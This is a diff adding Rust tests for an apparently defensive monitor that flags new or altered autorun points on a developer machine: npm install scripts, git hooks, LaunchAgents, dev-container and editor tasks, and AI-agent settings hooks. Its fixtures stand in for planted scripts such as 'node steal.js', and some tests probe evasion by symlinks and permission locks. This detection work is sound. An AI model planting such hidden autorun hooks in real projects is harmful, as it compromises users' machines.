+    let since = &e.status()["last_finished_run"]["since_previous_run"];
+    // The project, its file and the ways it holds are a first reading, never an addition.
+    assert_eq!(since["added"], 0, "{since}");
+    let page = changes_page(&e);
+    let counts = format!(
+        "+{} added, {} changed, {} removed, 2 things read for the first time and kept as the baseline",
+        since["added"], since["changed"], since["removed"]
+    );
+    assert!(page.contains(&counts), "{counts}\n{page}");
+    assert!(page.contains("<td>first reading</td>"), "{page}");
+    // The journal marks it, and the item rests on the place it names.
+    assert_eq!(
+        e.rows(
+            "SELECT CAST(COUNT(*) AS TEXT) FROM journal
+             WHERE text = 'read for the first time' AND predicate = 'watched_as'"
+        ),
+        ["1"]
+    );
+    assert_eq!(e.told(), ["checkout:machine:mac/Documents/code/app (1)"]);
+}
+
+#[test]
+fn a_watched_file_read_before_that_cannot_be_read_now_is_a_finding_with_why_and_a_change_meanwhile_is_found_after()
+ {
+    // Someone who wants to change a watched file unseen would break its reading first. Losing
+    // sight of a file read before is a finding of its kind, with why, and the file stays in
+    // coverage as not read; when it reads again, what changed meanwhile is a change.
+    let e = Estate::new("lose-sight-file");
+    let zshrc = e.home().join(".zshrc");
+    put(&zshrc, "export A=1\n");
+    e.run();
+    {
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::set_permissions(&zshrc, std::fs::Permissions::from_mode(0o000)).unwrap();
+        e.run();
+        std::fs::set_permissions(&zshrc, std::fs::Permissions::from_mode(0o644)).unwrap();
+    }
+    assert_eq!(e.found(), [pair("watched.shell-profile", "~/.zshrc")]);
+    assert_eq!(
+        e.rows(
+            "SELECT new_value FROM journal WHERE entry = 'not_read'
+               AND subject = 'file:machine:mac/.zshrc'"
+        ),
+        ["Permission denied (os error 13)"]
+    );
+    e.seen();
+    put(&zshrc, "export A=2\n");
+    e.run();
+    assert_eq!(e.found(), [pair("watched.shell-profile", "~/.zshrc")]);
+    assert_eq!(
+        e.rows(
+            "SELECT entry FROM journal WHERE subject = 'file:machine:mac/.zshrc'
+               AND predicate = 'has_content' ORDER BY seq DESC LIMIT 1"
+        ),
+        ["changed"]
+    );
+}
+
+#[test]
+fn a_project_file_read_before_that_cannot_be_read_now_is_a_finding_with_why_and_a_change_meanwhile_is_found_after()
+ {
+    let e = Estate::new("lose-sight-project");
+    let shop = e.checkout("dev/shop");
+    package(&shop, "\"postinstall\": \"node setup.js\"");
+    e.run();
+    let file = shop.join("package.json");
+    {
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o000)).unwrap();
+        e.run();
+        std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o644)).unwrap();
+    }
+    assert_eq!(
+        e.found(),
+        [pair("autorun.package-install", "~/dev/shop/package.json")]
+    );
+    assert!(
+        e.rows("SELECT new_value FROM journal WHERE entry = 'not_read'")
+            .iter()
+            .any(|why| why.contains("Permission denied")),
+    );
+    // What it held is kept while it cannot be read: the script is not gone.
+    assert!(
+        !e.rows(
+            "SELECT subject FROM assertion WHERE layer = 'live'
+               AND subject LIKE '%dev/shop/package.json#/scripts/postinstall'"
+        )
+        .is_empty()
+    );
+    e.seen();
+    package(&shop, "\"postinstall\": \"node steal.js\"");
+    e.run();
+    assert_eq!(
+        e.found(),
+        [pair(
+            "autorun.package-install",
+            "~/dev/shop/package.json#/scripts/postinstall"
+        )]
+    );
+}
+
+#[test]
+fn what_is_removed_from_a_place_read_in_full_is_gone_while_another_place_of_its_kind_cannot_be_read()
+ {
+    // The reading of a kind is partial when one of its places cannot be read. What is gone
+    // from a place that was read in full is still gone, and an autostart item removed is a
+    // finding, as an install script removed from a project is journaled as removed.
+    let e = Estate::new("removed-while-partial");
+    let agents = e.home().join("Library/LaunchAgents");
+    put(&agents.join("com.invented.sync.plist"), "<plist/>\n");
+    let system = e.0.join("system/Library/LaunchAgents");
+    put(&system.join("com.invented.helper.plist"), "<plist/>\n");
+    let shop = e.checkout("dev/shop");
+    package(&shop, "\"postinstall\": \"node setup.js\"");
+    let blog = e.checkout("dev/blog");
+    package(&blog, "\"postinstall\": \"node setup.js\"");
+    e.run();
+    let _locked = Locked::new(agents.clone());
+    let blog_file = blog.join("package.json");
+    {
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::set_permissions(&blog_file, std::fs::Permissions::from_mode(0o000)).unwrap();
+    }
+    std::fs::remove_file(system.join("com.invented.helper.plist")).unwrap();
+    package(&shop, "\"test\": \"jest\"");
+    let report = e.run();
+    {
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::set_permissions(&blog_file, std::fs::Permissions::from_mode(0o644)).unwrap();
+    }
+    assert!(
+        e.coverage(AUTOSTART_KIND).starts_with("partial|"),
+        "{}",
+        e.coverage(AUTOSTART_KIND)
+    );
+    assert!(
+        e.found().contains(&pair(
+            "watched.autostart",
+            "/Library/LaunchAgents/com.invented.helper.plist"
+        )),
+        "{:?}",
+        e.found()
+    );
+    assert!(
+        report.lines().any(|l| l.trim_start().starts_with("gone ")
+            && l.ends_with("dev/shop/package.json#/scripts/postinstall")),
+        "{report}"
+    );
+}
+
+#[test]
+fn after_the_first_check_nothing_present_and_unrecorded_is_ever_silent() {
+    // No false calm by construction: once the store has had its first check, a place read
+    // for the first time is told, never taken silently, whatever brought it into reach.
+    let e = Estate::new("never-silent");
+    let shop = e.checkout("dev/shop");
+    package(&shop, "\"postinstall\": \"node setup.js\"");
+    let app = e.checkout("Documents/code/app");
+    package(&app, "\"postinstall\": \"node setup.js\"");
+    let archived = e.checkout("archive/old");
+    package(&archived, "\"postinstall\": \"node setup.js\"");
+    let agents = e.home().join("Library/LaunchAgents");
+    put(&agents.join("com.invented.sync.plist"), "<plist/>\n");
+    let hidden = e.home().join(".tools/helper");
+    put(&hidden.join(".git/HEAD"), "ref: refs/heads/main\n");
+    package(&hidden, "\"preinstall\": \"node x.js\"");
+    {
+        let _a = Locked::new(e.home().join("archive"));
+        let _b = Locked::new(agents.clone());
+        e.run();
+    }
+    let after = e.last_entry();
+    e.run();
+    e.run_in(&e.home().join("Documents"));
+    session(&e, "helper", &hidden);
+    e.run_with(&e.home(), &e.0.join("sessions"));
+    assert_eq!(e.silent_after(after), 0);
+    let mut told = e.told();
+    told.sort();
+    assert_eq!(
+        told,
+        [
+            "checkout:machine:mac/.tools/helper (1)",
+            "checkout:machine:mac/Documents/code/app (1)",
+            "checkout:machine:mac/archive/old (1)",
+            "file:machine:mac/Library/LaunchAgents (1)",
+        ]
+    );
+}
+
+#[test]
+fn a_row_a_newer_version_reads_first_in_a_clone_found_earlier_is_told_once_and_raises_nothing() {
+    // A clone made after the first check is found. A later version reads a row the older one
+    // did not: what the clone held there could have been there since it arrived, so it is told
+    // once, not raised.
+    let e = Estate::new("new-row-old-clone");
+    e.checkout("dev/old");
+    e.run();
+    let evil = e.checkout("dev/evil");
+    package(&evil, "\"postinstall\": \"node setup.js\"");
+    put(
+        &evil.join(".devcontainer.json"),
+        r#"{"initializeCommand": "sh .x"}"#,
+    );
+    e.run();
+    assert!(
+        e.found().contains(&pair(
+            "autorun.editor-open",
+            "~/dev/evil/.devcontainer.json#/initializeCommand"
+        )),
+        "{:?}",
+        e.found()
+    );
+    e.seen();
+    // As a version that did not read dev container files left the store.
+    let db = Connection::open(e.store()).unwrap();
+    db.execute_batch(
+        "DELETE FROM assertion WHERE kind LIKE '.devcontainer/devcontainer.json%';
+         DELETE FROM coverage WHERE kind LIKE '.devcontainer/devcontainer.json%';
+         DELETE FROM unit_read WHERE kind LIKE '.devcontainer/devcontainer.json%';",
+    )
+    .unwrap();
+    drop(db);
+    e.run();
+    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
+    assert_eq!(e.told(), ["checkout:machine:mac/dev/evil (1)"]);
+}
+
+#[test]
+fn a_file_a_newer_version_could_not_read_at_first_in_a_clone_found_earlier_is_told_once_when_it_reads()
+ {
+    // The clone was found when it arrived, but the store holds nothing of a row a later
+    // version reads, whose file fails at first. When it reads, nothing shows it is new: it is
+    // told once, not raised.
+    let e = Estate::new("new-row-fails-old-clone");
+    e.checkout("dev/old");
+    e.run();
+    let evil = e.checkout("dev/evil");
+    package(&evil, "\"postinstall\": \"node setup.js\"");
+    link(
+        "missing/devcontainer.json",
+        &evil.join(".devcontainer.json"),
+    );
+    e.run();
+    e.seen();
+    // As a version that did not read dev container files left the store.
+    let db = Connection::open(e.store()).unwrap();
+    db.execute_batch(
+        "DELETE FROM assertion WHERE kind LIKE '.devcontainer/devcontainer.json%';
+         DELETE FROM coverage WHERE kind LIKE '.devcontainer/devcontainer.json%';
+         DELETE FROM unit_read WHERE kind LIKE '.devcontainer/devcontainer.json%';",
+    )
+    .unwrap();
+    drop(db);
+    e.run();
+    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
+    std::fs::remove_file(evil.join(".devcontainer.json")).unwrap();
+    put(
+        &evil.join(".devcontainer.json"),
+        r#"{"initializeCommand": "sh .x"}"#,
+    );
+    e.run();
+    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
+    assert_eq!(e.told(), ["checkout:machine:mac/dev/evil (1)"]);
+}
+
+// Something there that cannot be read is judged by the same three cases, and something read
+// before is gone only when it is absent. Each of the next tests began as a probe of the
+// second review, on full walks of the home folder.
+
+#[test]
+fn hooks_read_before_whose_git_folder_became_a_git_file_are_lost_sight_of_and_found() {
+    // The git folder moved out of reach, a `.git` file left pointing to it, a hook planted
+    // there: git runs it. The hooks read before are not gone; losing sight of them is found.
+    let e = Estate::new("git-file-later");
+    let shop = e.checkout("dev/shop");
+    put(&shop.join(".git/hooks/pre-commit"), "#!/bin/sh\nexit 0\n");
+    e.full();
+    e.full();
+    assert!(e.found().is_empty(), "{:?}", e.found());
+    let gitdir = e.home().join(".cache/shop.git");
+    std::fs::create_dir_all(gitdir.parent().unwrap()).unwrap();
+    std::fs::rename(shop.join(".git"), &gitdir).unwrap();
+    put(
+        &shop.join(".git"),
+        &format!("gitdir: {}\n", gitdir.display()),
+    );
+    put(&gitdir.join("hooks/post-checkout"), "#!/bin/sh\n");
+    e.full();
+    assert_eq!(
+        e.found(),
+        [pair("watched.git-hook", "~/dev/shop/.git/hooks")]
+    );
+    // Said once while it stays so.
+    e.seen();
+    e.full();
+    assert!(e.found().is_empty(), "{:?}", e.found());
+}
+
+#[test]
+fn an_autostart_item_new_to_a_folder_listed_before_is_found_while_it_cannot_be_looked_at() {
+    let e = Estate::new("unsearchable");
+    e.checkout("dev/shop");
+    let agents = e.home().join("Library/LaunchAgents");
+    std::fs::create_dir_all(&agents).unwrap();
+    e.full();
+    e.full();
+    put(&agents.join("com.invented.updater.plist"), "<plist/>\n");
+    {
+        // Listed, but no entry can be looked at.
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::set_permissions(&agents, std::fs::Permissions::from_mode(0o644)).unwrap();
+        e.full();
+        std::fs::set_permissions(&agents, std::fs::Permissions::from_mode(0o755)).unwrap();
+    }
+    assert_eq!(
+        e.found(),
+        [pair(
+            "watched.autostart",
+            "~/Library/LaunchAgents/com.invented.updater.plist"
+        )]
+    );
+    assert!(
+        e.rows("SELECT new_value FROM journal WHERE entry = 'not_read'")
+            .iter()
+            .any(|why| why.contains("Permission denied")),
+    );
+}
+
+#[test]
+fn an_editor_extension_installed_as_a_link_into_a_guarded_folder_is_found() {
+    let e = Estate::new("guarded-new-extension");
+    e.checkout("dev/shop");
+    let ext = e.home().join(".vscode/extensions");
+    std::fs::create_dir_all(ext.join("invented.good-1.0.0")).unwrap();
+    e.full();
+    e.full();
+    let real = e.home().join("Documents/x/invented.evil-1.0.0");
+    std::fs::create_dir_all(&real).unwrap();
+    link(real.to_str().unwrap(), &ext.join("invented.evil-1.0.0"));
+    e.full();
+    assert_eq!(
+        e.found(),
+        [pair(
+            "autorun.editor-extension",
+            "~/.vscode/extensions/invented.evil"
+        )]
+    );
+}
+
+#[test]
+fn a_clone_made_after_the_first_check_is_found_when_its_files_or_hooks_lead_into_a_guarded_folder()
+{
+    let e = Estate::new("guarded-clone");
+    e.checkout("dev/shop");
+    e.full();
+    e.full();
+    let evil = e.checkout("dev/evil");
+    let real = e.home().join("Documents/x");
+    put(&real.join("tasks.json"), ON_OPEN);
+    put(&real.join("settings.json"), HOOK);
+    put(&real.join("hooks/post-checkout"), "#!/bin/sh\n");
+    link(
+        real.join("tasks.json").to_str().unwrap(),
+        &evil.join(".vscode/tasks.json"),
+    );
+    link(
+        real.join("settings.json").to_str().unwrap(),
+        &evil.join(".claude/settings.json"),
+    );
+    link(
+        real.join("hooks").to_str().unwrap(),
+        &evil.join(".git/hooks"),
+    );
+    e.full();
+    assert_eq!(
+        e.found(),
+        [
+            pair("autorun.agent-start", "~/dev/evil/.claude/settings.json"),
+            pair("autorun.folder-open", "~/dev/evil/.vscode/tasks.json"),
+            pair("watched.git-hook", "~/dev/evil/.git/hooks"),
+        ]
+    );
+    // Found once while it stays so.
+    e.seen();
+    e.full();
+    assert!(e.found().is_empty(), "{:?}", e.found());
+}
+
+#[test]
+fn a_project_moved_behind_a_link_at_its_old_path_is_not_gone_and_losing_sight_of_it_is_found() {
+    let e = Estate::new("moved-behind-link");
+    let shop = e.checkout("dev/shop");
+    put(&shop.join(".git/hooks/pre-commit"), "#!/bin/sh\nexit 0\n");
+    e.full();
+    e.full();
+    let real = e.home().join(".local/share/shop");
+    std::fs::create_dir_all(real.parent().unwrap()).unwrap();
+    std::fs::rename(&shop, &real).unwrap();
+    link(real.to_str().unwrap(), &shop);
+    put(&real.join(".git/hooks/post-checkout"), "#!/bin/sh\n");
+    e.full();
+    assert_eq!(
+        e.found(),
+        [pair("watched.git-hook", "~/dev/shop/.git/hooks")]
+    );
+    assert_eq!(
+        e.rows(
+            "SELECT entry FROM journal WHERE subject = 'checkout:machine:mac/dev/shop'
+               AND predicate = 'located_on' ORDER BY seq"
+        ),
+        ["added"],
+        "the checkout is not journaled as removed"
+    );
+}
+
+#[test]
+fn each_check_with_first_readings_raises_its_own_item_whatever_was_answered_about_an_earlier_one() {
+    // The item of one check marked expected, or still open, hides nothing a later check reads
+    // for the first time.
+    let e = Estate::new("item-per-check");
+    e.checkout("dev/shop");
+    std::fs::create_dir_all(e.home().join(".cache/pip")).unwrap();
+    std::fs::create_dir_all(e.home().join(".config/pip")).unwrap();
+    let tools = e.checkout(".tools/helper");
+    put(&tools.join(".git/hooks/pre-push"), "#!/bin/sh\nexit 0\n");
+    e.full();
+    e.full();
+    e.run_in(&e.home().join(".tools"));
+    assert_eq!(e.told(), ["checkout:machine:mac/.tools/helper (1)"]);
+    let first = e.contract(&["findings"])["findings"][0]["finding"]["id"]
+        .as_str()
+        .unwrap()
+        .to_string();
+    let out = Command::new(env!("CARGO_BIN_EXE_immune"))
+        .args([
+            "finding",
+            &first,
+            "expected",
+            "--reason",
+            "my own tools folder",
+            "--store",
+        ])
+        .arg(e.store())
+        .output()
+        .unwrap();
+    assert!(
+        out.status.success(),
+        "{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    assert!(e.found().is_empty(), "{:?}", e.found());
+    let evil = e.checkout(".cache/evil");
+    put(&evil.join(".git/hooks/post-merge"), "#!/bin/sh\n");
+    let printed = e.run_in(&e.home().join(".cache"));
+    assert_eq!(e.found(), [pair(FIRST_READ, "mac")]);
+    assert_eq!(e.told(), ["checkout:machine:mac/.cache/evil (1)"]);
+    assert!(printed.contains("1 new in this run"), "{printed}");
+    // While that one is open, the next check's first readings are an item of their own.
+    let other = e.checkout(".config/other");
+    put(&other.join(".git/hooks/pre-push"), "#!/bin/sh\n");
+    let printed = e.run_in(&e.home().join(".config"));
+    assert!(printed.contains("1 new in this run"), "{printed}");
+    assert_eq!(
+        e.told(),
+        [
+            "checkout:machine:mac/.cache/evil (1)",
+            "checkout:machine:mac/.config/other (1)"
+        ]
     );
 }
